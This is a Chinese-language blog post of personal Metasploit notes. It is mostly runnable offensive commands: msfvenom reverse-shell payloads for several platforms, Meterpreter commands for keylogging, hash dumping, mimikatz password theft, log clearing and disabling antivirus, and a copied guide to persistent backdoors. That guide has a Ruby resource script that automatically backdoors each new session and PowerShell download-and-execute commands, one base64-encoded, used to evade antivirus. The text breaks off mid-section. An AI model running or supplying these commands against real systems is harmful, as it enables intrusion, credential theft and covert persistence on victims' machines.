        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://cache-1253916356.file.myqcloud.com/%E7%B4%A0%E6%9D%90/u%3D1256657876%2C246930681%26fm%3D26%26gp%3D0.jpg)">
    
            <p class="article-headline-p">
                Metasploit基础使用
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>AresX</strong>
        <span>7月 29, 2017</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    
        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">devices other</i>
    <span class="visuallyhidden">devices other</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
    
        <img src="https://pan.baidu.com/share/qrcode?w=246&h=246&url=https://ares-x.com/2017/07/29/Metasploit基础使用/">
    
</ul>
    

    <!-- Tags (bookmark) -->
    
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/Metasploit/">Metasploit</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/渗透工具/">渗透工具</a>
    </ul>
    

    <!-- Share -->
    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    
        
            <!-- Busuanzi Views -->
            <a class="post_share-link" href="#">
                <li class="mdl-menu__item">
                    <span id="busuanzi_container_page_pv">
                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
                    </span>
                </li>
            </a>
        
    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Metasploit基础使用&url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html&pic=&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Metasploit基础使用&url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html&via=AresX" target="_blank">
            <li class="mdl-menu__item">
                分享到 Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    
        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Google+
            </li>
        </a>
    

    <!-- Share LinkedIn -->
    
        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html&title=Metasploit基础使用" target="_blank">
            <li class="mdl-menu__item">
                分享到 LinkedIn
            </li>
        </a>
    

    <!-- Share QQ -->
    
        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=Metasploit基础使用&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 QQ
            </li>
        </a>
    

    <!-- Share Telegram -->
    
        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2017/07/29/Metasploit基础使用/index.html&text=Metasploit基础使用" target="_blank">
            <li class="mdl-menu__item">
                分享到 Telegram
            </li>
        </a>
    
</ul>

</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <hr>
<p><em>笔记来自个人整理以及互联网,会在学习过程中坚持维护</em></p>
<hr>
<h3 id="Metasploit体系框架"><a href="#Metasploit体系框架" class="headerlink" title="Metasploit体系框架"></a>Metasploit体系框架</h3><ol>
<li>基础库文件</li>
</ol>
<p>基础库文件位于源码根目录下的libraries目录中，包括</p>
<p>Rex //整个Metasploit框架所依赖的最基础的组件，为开发者提供基础功能支持</p>
<p>framwork-core //负责实现所有与各种类型的上层模块及插件的交互接口</p>
<p>framework-base //扩展了framework-core，提供更加简单的包装例程，为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块</p>
<ol>
<li>模块</li>
</ol>
<p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。<br>分为</p>
<p>Aux（辅助模块）</p>
<p>Exploit（攻击模块）</p>
<p>Payloads（攻击载荷模块）</p>
<p>Nops（空指令模块）</p>
<p>Encoders（编码器模块）</p>
<p>#知道漏洞名称之后可以在</p>
<pre><code>https://www.exploit-db.com
https://www.rapid7.com
</code></pre><p>搜索对应的模块或者pc添加利用</p>
<p>Parrot中默认路径为:<code>/usr/share/metasploit-framework/modules</code></p>
<ol>
<li>插件 </li>
</ol>
<p>插件是扩充的功能，可以集成现有的一些玩不安全工具比如Nessus OpenVAS等，为用户接口提供新的命令</p>
<ol>
<li>接口<br>Metasploit框架提供了多种用户接口，包括</li>
</ol>
<p>msfconsole控制台终端</p>
<p>msfcli命令行</p>
<p>armitage图形化界面</p>
<p>msfapi远程调用接口</p>
<ol>
<li>功能程序</li>
</ol>
<p>Metasploit提供了一些列可直接运行的功能程序，支持用户快速利用Metasploit框架内部能力完一些任务。</p>
<hr>
<ul>
<li>启动metasploit（命令行模式） ：<code>msfconsole</code></li>
<li>（图形化模式）：<del>msfgui</del></li>
<li>升级metasploit：<code>msfupdate</code></li>
<li>查看命令使用帮助信息：<code>help [COMMAND]</code></li>
<li>搜索模块：<code>search</code> [模块名 //(search ms08-067)</li>
<li>选择模块：<code>use xxx/xxx/xxx</code></li>
<li>查看模块信息:<code>info</code></li>
<li>查看攻击载荷：<code>show payloads</code></li>
<li>设置攻击载荷：<code>set payload xxx/xxx/xxx</code></li>
<li>查看需要设置的配置参数：<code>show options</code></li>
<li>设置配置参数：<code>set XXXX xxxxxx</code></li>
<li>开始攻击：<code>exploit</code></li>
<li>退出当前模块:<code>back</code></li>
<li>退出msf : <code>exit</code></li>
<li>使用.rc脚本自动化处理<br>如创建<code>listener.rc</code>文件写入<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST &lt;Your Vps&#39;s IP&gt;
set LPORT &lt;Your Port&gt;
set ExitOnSession false
exploit -j-z
</code></pre>使用时运行<code>msfconsole -r /opt/listner.rc</code>即可自动执行.rc文件内的命令省去频繁操作</li>
</ul>
<hr>
<ul>
<li>搜索时出现[!] Database not connected or cache not built, using slow search<pre><code>  msf &gt; db_status
  service postgresql start
  sercice metasploit start
  msf &gt; db_rebuild_cache
</code></pre><h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><strong>help参数</strong></li>
</ul>
<pre><code>Options:
    -p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;#039;-&amp;#039;或者stdin指定
    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
    -n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
    -f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
    -a, --arch       &lt;architecture&gt;  指定payload的目标架构
        --platform   &lt;platform&gt;      指定payload的目标平台
    -s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
    -b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
    -i, --iterations &lt;count&gt;         指定payload的编码次数
    -c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
    -x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
        --payload-options            列举payload的标准选项
    -o, --out   &lt;path&gt;               保存payload
    -v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
        --shellest                   最小化生成payload
    -h, --help                       查看帮助选项
        --help-formats               查看msf支持的输出格式列表
</code></pre><p>生成payload，有有两个必须的选项：-p -f </p>
<p>使用-p 来指定要使用的payload。</p>
<p>可以使用下面的命令来查看所有msf可用的payload列表 </p>
<pre><code>msfvenom -l payloads
</code></pre><p>-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:</p>
<pre><code>cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
</code></pre><p>使用-f 来指定payload的输出格式</p>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe
</code></pre><p>使用下面的命令，可以产看msf支持的输出格式</p>
<pre><code>msfvenom --help-formats
</code></pre><p><strong>几个典型的msfvenom使用</strong>：</p>
<ul>
<li>Windows</li>
</ul>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker&#39;s IP] LPORT=4444 -f exe -o /tmp/my_payload.exe
</code></pre><ul>
<li>Linux</li>
</ul>
<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; root.elf
</code></pre><ul>
<li>Mac</li>
</ul>
<pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f macho &gt; shell.macho
</code></pre><ul>
<li>Bash</li>
</ul>
<pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh
</code></pre><ul>
<li>PHP</li>
</ul>
<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
</code></pre><ul>
<li>JSP</li>
</ul>
<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp
</code></pre><ul>
<li>Python</li>
</ul>
<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py
</code></pre><p><strong>对payload进行编码</strong></p>
<p>如果你使用了-b选项（设定了规避字符集），会自动调用编码器。</p>
<p>其他情况下，你需要使用-e选项来使用编码模块，例如：</p>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
</code></pre><p>可以使用下面的命令，来查看可用的编码器</p>
<pre><code>msfvenom -l encoders
</code></pre><p>你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。</p>
<p>可以使用下面的命令来进行迭代编码：</p>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
</code></pre><p><strong>规避字符</strong></p>
<p>使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如：</p>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -b &amp;#039;\x00&amp;#039; -f raw
</code></pre><p><strong>使用自定义可执行文件模板</strong></p>
<p>默认的，msfvenom使用的模板文件保存在msf/data/templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如：</p>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe
</code></pre><p>这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。</p>
<h2 id="监听连接"><a href="#监听连接" class="headerlink" title="监听连接"></a>监听连接</h2><p>使用exploit/multi/handler监听连入的backdoor</p>
<pre><code>msf &gt; use exploit/multi/handler             
</code></pre><p>设置对应的payload</p>
<pre><code>msf  exploit(handler) &gt; set payload windows/meterpreter/reverse_http            
</code></pre><p>显示设置</p>
<pre><code>msf  exploit(handler) &gt; show options                       
</code></pre><p>显示高级设置</p>
<pre><code>msf exploit(handler)&gt; show advanced
</code></pre><p>进行设置如set LHOST之后</p>
<pre><code>msf  exploit(handler) &gt; exploit -j
</code></pre><p>在后台运行handler进行监听payload的连接</p>
<p>查看会话</p>
<pre><code>sessions
</code></pre><ul>
<li>小技巧,使用命令<code>set ExitOnSession false</code>为保持会话存活,可以同时接受多个sessions </li>
</ul>
<h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>查看会话</p>
<pre><code>sessions
</code></pre><p>列出可用的交互会话（在处理多个shell时使用）</p>
<pre><code>sessions -l
</code></pre><p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</p>
<pre><code>sessions -l -v
</code></pre><p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本</p>
<pre><code>sessions -s script
</code></pre><p>在所有活跃的metasploit会话上执行一个命令。</p>
<pre><code>sessions -c cmd
</code></pre><ul>
<li><em>对于cmd会话，应执行cmd命令，对于meterpreter会话，应执行meterpreter命令，如果命令中间有空格，可使用””包裹命令</em></li>
</ul>
<p>升级一个普通的cmd shell到meterperter shell</p>
<pre><code>sessions -u sessionID
</code></pre><ul>
<li><em>可同时设定多个sessionID,如执行<code>sessions -u 1,2,3,4</code></em></li>
</ul>
<hr>
<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><strong>核心命令</strong></p>
<pre><code>? – 帮助菜单
background – 将当前会话移动到背景
bgkill – 杀死一个背景 meterpreter 脚本
bglist – 提供所有正在运行的后台脚本的列表
bgrun – 作为一个后台线程运行脚本
channel – 显示活动频道
close – 关闭通道
exit – 终止 meterpreter 会话
help – 帮助菜单
info - 
interact – 与通道进行交互
irb – 进入 Ruby 脚本模式
migrate – 移动到一个指定的 PID 的活动进程
quit – 终止 meterpreter 会话
read – 从通道读取数据
run – 执行以后它选定的 meterpreter 脚本
use – 加载 meterpreter 的扩展
write – 将数据写入到一个通道
</code></pre><p><strong>文件系统命令</strong></p>
<pre><code>cat -读取并输出到标准输出文件的内容
cd -更改目录对受害人
del -删除文件对受害人
download-从受害者系统文件下载
search - 在目标主机文件系统上查找搜索文件例如：search  -d  c:\\  -f  *.doc  在目标主机C盘下搜索doc文档
edit-用 vim编辑文件
getlwd -打印本地目录
getwd -打印工作目录
lcd -更改本地目录
lpwd -打印本地目录
ls -列出在当前目录中的文件列表
mkdir -在受害者系统上的创建目录
pwd -输出工作目录
rm -删除文件
rmdir -受害者系统上删除目录
upload-从攻击者的系统往受害者系统上传文件
</code></pre><p><strong>网络命令</strong></p>
<pre><code>ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。
portfwd -端口转发 例如：portfwd  add -l  1122 -p 3389 -r  192.168.250.176把目标主机192.168.250.176的3389端口转发到1122端口
route -查看或加入受害者路由表  route add 5.5.5.0 255.255.255.0 1 用sessions 1会话加入指定网段
arp - 显示主机ARP缓存
getproxy - 显示当前代理配置
netstat - 显示网络连接
</code></pre><p><strong>系统命令</strong></p>
<pre><code>clearev -清除了受害者的计算机上的事件日志
drop_token -被盗的令牌
execute-执行命令 在目标主机上运行某个程序 execute  -f  notepad.exe 行目标主机上的记事本程序 隐藏后台执行，加参数-H
getpid -获取当前进程 ID (PID)
getprivs -尽可能获取尽可能多的特权
getenv        获取一个或多个环境变量值
localtime     显示目标系统的本地日期和时间
pgrep         按名称显示进程
pkill         按名称终止进程
getuid -获取作为运行服务器的用户
kill -终止指定 PID 的进程
ps -列出正在运行的进程
reboot-重新启动受害人的计算机
reg -与受害人的注册表进行交互
rev2self -在受害者机器上调用 RevertToSelf()
shell -在受害者计算机上打开一个shell
shutdown-关闭了受害者的计算机
steal_token -试图窃取指定的 (PID) 进程的令牌
suspend - 暂停或恢复进程列表
sysinfo -获取有关受害者计算机操作系统和名称等的详细信息
</code></pre><p><strong>用户界面命令</strong></p>
<pre><code>enumdesktops -列出所有可访问台式机
getdesktop -获取当前的 meterpreter 桌面
idletime -检查长时间以来，受害者系统空闲进程
keyscan_dump -键盘记录软件的内容转储
keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件
keyscan_stop -停止键盘记录软件
screenshot-抓去 meterpreter 桌面的屏幕截图
set_desktop -更改 meterpreter 桌面
uictl -启用用户界面组件的一些控件
</code></pre><p><strong>提权命令</strong></p>
<pre><code>getsystem -获得系统管理员权限
</code></pre><p><strong>密码转储命令</strong></p>
<pre><code>hashdump -抓去哈希密码 (SAM) 文件中的值
</code></pre><p>hashdump 可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。</p>
<p><strong>Timestomp 命令</strong></p>
<pre><code>timestomp -操作修改，访问，并创建一个文件的属性
</code></pre><hr>
<h2 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h2><p>抓取目标主机所有用户的明文密码</p>
<pre><code>load mimikatz
wdigest
</code></pre><p>注入载荷</p>
<pre><code>use post/windows/manage/payload_inject
</code></pre><p>确定目标主机是否是一台虚拟机</p>
<pre><code>run  checkvm
</code></pre><p>自动开启3389或者任意端口</p>
<pre><code>use post/windows/manage/enable_rdp
</code></pre><p>开启目标主机远程桌面，并可添加管理员组账号</p>
<pre><code>run  getgui  -e
</code></pre><p>开启目标主机的远程桌面服务后，可以添加账号以便利用<br>命令：</p>
<pre><code>run  getgui  -u  example_username  -p  example_password
</code></pre><p>连接远程桌面</p>
<pre><code>rdesktop -u username -p passwd IP
</code></pre><p>关闭防护软件</p>
<pre><code>run killav
</code></pre><p>键盘记录</p>
<pre><code>run keylogrecorder
</code></pre><p>查看对方桌面</p>
<pre><code>run vnc
</code></pre><p>获取目标主机上的软件安装信息    </p>
<pre><code>run  post/windows/gather/enum_applications
</code></pre><p>获取目标主机上最近访问过的文档、链接信息    </p>
<pre><code>run  post/windows/gather/dumplinks
</code></pre><p>查看目标系统所有网络流量并且进行数据包记录</p>
<pre><code>run packetrecorder -i 0 //-i 1指定记录数据包的网卡
</code></pre><p>读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码    </p>
<pre><code>run  post/windows/gather/enum_ie //获取到的目标主机上的ie浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的/root/.msf5/loot/目录下
</code></pre><hr>
<h2 id="Meterpreter维持访问"><a href="#Meterpreter维持访问" class="headerlink" title="Meterpreter维持访问"></a>Meterpreter维持访问</h2><p>//文章来自<a href="http://www.evil0x.com/posts/26075.html" target="_blank" rel="external">http://www.evil0x.com/posts/26075.html</a></p>
<h3 id="0x01-MSF-Persistent-Scripts"><a href="#0x01-MSF-Persistent-Scripts" class="headerlink" title="0x01 MSF Persistent Scripts"></a>0x01 MSF Persistent Scripts</h3><p><strong>1、Persistence</strong></p>
<p>路径：metasploit/scripts/meterpreter/persistence.rb，用于创建通过启动项启动。会创建注册表，创建文件，很容易被杀软拦截。</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/4733834aff05885c3698.png" alt=""></p>
<p>使用举例：</p>
<pre><code>run persistence -A -U -i 5 -p 4455 -r 103.79.77.110
</code></pre><p>使用-S可创建服务。-U 会在HKCU添加启动项，-X 会在HKLM添加启动项</p>
<p>能实现同样功能的脚本还有：</p>
<pre><code>exploit/windows/local/persistence.rb
exploit/windows/local/registry_persistence.rb
</code></pre><p><strong>2、Metsvc</strong></p>
<p>路径：metasploit/scripts/meterpreter/metsvc.rb，用于创建服务启动。会创建meterpreter服务，并上传三个文件，很容易被杀软拦截，且安装服务需要管理员权限。</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/f381509c355d542053b8.png" alt=""></p>
<p>使用举例：</p>
<pre><code>run metsvc -A
</code></pre><p>使用 -R 参数可卸载服务。</p>
<p><strong>3、Scheduleme &amp; Schtasksabuse</strong></p>
<p>路径：</p>
<pre><code>metasploit/scripts/meterpreter/scheduleme.rb
metasploit/scripts/meterpreter/schtasksabuse.rb
</code></pre><p>这两个脚本都是通过schtasks来创建计划任务来达到维持权限的目的，区别是scheduleme 需要当前进程拥有最高管理权限，而schtasksabuse则不需要，（测试发现很容易被杀软拦截）。</p>
<p>使用举例：</p>
<p>scheduleme</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/ac2102d62ab34bd6a3fa.png" alt=""></p>
<pre><code>run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; #上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39;
run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分钟执行一次打开计算器命令
</code></pre><p>其他参数有兴趣自己看看就不详细介绍了</p>
<p>schtasksabuse</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/40f558da8d62f1c4d940.png" alt=""></p>
<pre><code>run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4  #每隔4秒执行一次calc.exe
</code></pre><p>使用脚本需要加-T参数</p>
<p>能实现同样功能的脚本还有：</p>
<pre><code>exploits/windows/local/s4u_persistence.rb
</code></pre><p><strong>4、Mof_ps_persist</strong></p>
<p>之前在 Powershell之MOF后门 提到过，创建WMI后门的一种方式，可以在你的MSF添加此脚本。(运行需要管理员权限，不容易被拦截)</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/5f189005701c47aa91b8.png" alt=""></p>
<p>当然，MSF持续控制的脚本还有几个，这里就不一一介绍了。</p>
<h3 id="0x02-Autorunscript"><a href="#0x02-Autorunscript" class="headerlink" title="0x02 Autorunscript"></a>0x02 Autorunscript</h3><p>说到要自动运行脚本，离不了autorunscript。autorunscript是一个十分强大的脚本，可以让我们在生成会话的同时，执行指定的操作。现在可以直接通过autorunscript来直接调用的脚本已经有66个，目录在metasploit/scripts/meterpreter，包括屏幕截图，获取环境变量等等，还有我们常用的migrate，uploadexec等。</p>
<p>举个例子，如果我们想在获取到会话的同时，执行persistence进行留后门操作可以直接这样：</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.2.101
set LPORT 5555
set ExitOnSession false
set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30
exploit -j -z
</code></pre><p>当生成会话以后，自动执行persistence，结果就像这样：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/f4108d3f9ddfa8026763.png" alt=""></p>
<p>当然，同样可以设置metsvc</p>
<pre><code>set AutoRunScript metsvc -A
</code></pre><p>其实，从标题上来讲，此文已经可以结束了，因为现在完全可以实现Automated Persistent Backdoor的目的。但是，以上两种方式很容易被杀软拦截，那我们还有什么方式么？答案是有的。</p>
<p>在介绍之前，再介绍两个很有用的脚本。multi_console_command 及 multicommand。</p>
<p>multi_console_command：用来执行msf的命令的脚本，帮助信息如下：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/af70ae97ea1041822d62.png" alt=""></p>
<p>使用示例：</p>
<pre><code>meterpreter &gt; run multi_console_command -cl &quot;pwd&quot;
</code></pre><p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/6ece096db80fb1f7a3b4.png" alt=""></p>
<p>CL参数用来执行一条METERPRETER的命令，RC参数用来执行多条METERPRETER命令，按行分割。</p>
<p>multicommand：用来执行cmd命令的脚本，帮助信息如下：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/7b6b867740d4aae7fe35.png" alt=""></p>
<p>使用示例：</p>
<p>run multicommand -cl “whoami”</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/b899cac70ada5183c21a.png" alt=""></p>
<p>此脚本可用来执行CMD命令，有一个缺点就是会一直等待执行的程序退出以返回结果。</p>
<h3 id="0x03-Resource-scripts"><a href="#0x03-Resource-scripts" class="headerlink" title="0x03 Resource scripts"></a>0x03 Resource scripts</h3><p>除了使用以上Autorunscript，使用Resource 脚本也是可以的，通常我们常见的rc脚本内容是这样的：</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.184
set ExitOnSession false
exploit -j -z
</code></pre><p>将以上内容保存为1.rc，然后执行如下命令：</p>
<pre><code>msfconsole -r 1.rc
</code></pre><p>自动输入命令而省去了我们一条一条输入的繁琐。其实，rc文件里面也可以写ruby代码的，一个简单的示例如下：</p>
<pre><code>use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.2.101
set lport 6666
set uripath /
set ExitOnSession false
exploit -j
&lt;ruby&gt;
    sleep(1)
    print_status(&quot;Waiting on an incoming sessions...&quot;)
    while (true)
        framework.sessions.each_pair do |sid,s|
            thost = s.tunnel_peer.split(&quot;:&quot;)[0]
            # Ensure that stdapi has been loaded before running
            if s.ext.aliases[&#39;stdapi&#39;]
                sleep(2)
                print_status(&quot;run screenshot to session #{sid} #{thost}...&quot;)
                s.console.run_single(&quot;screenshot&quot;)
                sleep(2)
                print_status(&quot;Executing persistent command...&quot;)
                s.console.run_single(&quot;run persistence -r 192.168.2.101 -p 5556 -U -i 30&quot;)
                sleep(4)
                print_status(&quot;Closing session #{sid} #{thost}...&quot;)
                s.kill
                print_status(&quot;Waiting on an incoming sessions...&quot;)
            else
                print_status(&quot;Session #{sid} #{thost} active, but not yet configured&quot;)
                sleep(15)
            end

        end
        sleep(4)
    end

    print_status(&quot;All done&quot;)
&lt;/ruby&gt;
</code></pre><p>使用以上Resource的效果是，开启</p>
<pre><code>exploit/multi/script/web_delivery
</code></pre><p>进行配置并开启监听，当产生一个会话以后，自动执行screenshot以及persistent操作，最后关闭当前会话继续等待。效果如下图:</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/b59e35fd9e4aea684095.png" alt=""></p>
<h3 id="0x04-绕过拦截"><a href="#0x04-绕过拦截" class="headerlink" title="0x04 绕过拦截"></a>0x04 绕过拦截</h3><p>至此，我们已经可以通过使用autorunscript或者使用添加ruby代码的resource脚本两种方式来让msf在产生会话的同时自动创建Persistent Backdoor了，那么AV那一关怎么过呢？别着急，很多人都知道，Powershell在绕AV上有不错的效果，那我们就试试使用Powershell。</p>
<p>测试过程如下：</p>
<p>1、首先我们先通过web_delivery的PSH获取到一个meterpreter会话。<br>2、构造创建计划任务命令如下：</p>
<pre><code>schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1 #指定每1小时执行一次notepad.exe
</code></pre><p>3、测试shell下直接执行(被拦截):</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/a8b7124ed07af9fcfe78.png" alt=""></p>
<p>4、将以上命令写入schtasks.ps1，然后通过IEX下载执行，这种方式就不会被拦截了：</p>
<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&#39;);&quot;
</code></pre><p>测试如下图：</p>
<p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/46b1ec8d8bb7c92f5798.gif" alt=""></p>
<p>未被拦截的情况下成功建立计划任务。</p>
<p>5、将命令写入autorunscript：</p>
<p>由于命令中存在引号，可以通过编码方式解决，详细如下：</p>
<pre><code>echo &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&#39;);&quot; | iconv --to-code UTF-16LE |base64
</code></pre><p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/6cbf8ac05489a9244f4e.png" alt=""></p>
<p>最后执行的命令为：</p>
<pre><code>powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUgBpAGQAdABlAHIALwBQAGUAbgB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8ARABlAG0AbwBTAGgAZQBsAGwALwBzAGMAaAB0AGEAcwBrAHMALgBwAHMAMQAnACkAOwAKAA==
</code></pre><p>之后我们就需要用到multicommand脚本了，自动运行的命令为：</p>
